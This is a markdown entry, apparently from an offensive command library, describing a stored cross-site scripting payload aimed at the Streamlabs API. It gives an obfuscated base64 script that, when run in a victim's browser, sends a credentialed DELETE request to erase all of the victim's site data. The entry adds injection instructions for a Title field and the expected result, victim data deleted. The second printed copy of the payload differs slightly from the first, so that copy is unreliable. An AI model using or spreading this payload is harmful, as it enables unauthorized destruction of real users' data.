---
data: >-
  <script>eval(atob("dmFyIHhudHRwPW5ldyBYTUxIdHRwUmVxdWVzdDt4aHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKXs0PT10aGlzLnJlYWR5U3RhdGUmJihkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGVtbyIpLmlubmVySFRNTD1hbGVydCh0aGlzLnJlc3BvbnNlVGV4dCkpfSx4aHR0cC5vcGVuKCJERUxFVEUiLCJodHRwczovL3N0cmVhbWxhYnMuY29tL2FwaS92Ni9zaXRlL2V2ZXJ5dGhpbmciKSx4aHR0cC53aXRoQ3JlZGVudGlhbHM9ITAseGh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwiYXBwbGljYXRpb24vanNvbjsiKSx4aHR0cC5zZW5kKCk7"))</script>
tags:
  - xss
  - deletion
  - api
type: command
executor: javascript
platforms:
  - Web
id: eeaa5cb4-064a-4b6b-bc91-019910b893a6
created_at: '2025-12-13T23:52:55.349Z'
updated_at: '2025-12-13T23:52:55.349Z'
verified: false
validated: true
submitted: true
---
# stored-xss-delete-site-payload

## Command

```javascript
<script>eval(atob("dmFyIHhudHRwPW5ldyBYTUxIdHRwUmVxdWVzdDt4aHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKXs0PT10aGlzLnJlYWR5U3RhdGUmJihkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGVtbyIpLmlubmVySFRNTD1hbGVydCh0aGlzLnJlc3BvbnNlVGV4dCkpfSx4aHR0cC5vcGVuKCJERUxFVEUiLCJodHRwczovL3N0cmVhbWxhYnMuY29tL2FwaI92Ni9zaXRlL2V2ZXJ5dGhpbmciKSx4aHR0cC53aXRoQ3JlZGVudGlhbHM9ITAseGh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwiYXBwbGljYXRpb24vanNvbjsiKSx4aHR0cC5zZW5kKCk7"))</script>
```

## Description

Advanced base64-encoded JavaScript payload that, when executed via stored XSS, sends a credentialed DELETE request to the Streamlabs API to remove all site data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| open | DELETE method to API endpoint | Yes |
| withCredentials | Include cookies (set to true) | Yes |
| setRequestHeader | Content-Type for JSON | Yes |
| send | No body for DELETE | Yes |

## Examples

### Basic Usage

```javascript
<script>eval(atob("..."))</script>
```

### Advanced Usage

Inject directly into Title field for storage.

## Expected Output

Successful 200 response from API; victim's site data deleted.

## Related

- [[commands/stored-xss-alert-payload]]
- [[procedures/Inject-Stored-XSS-in-Goal-Title]]
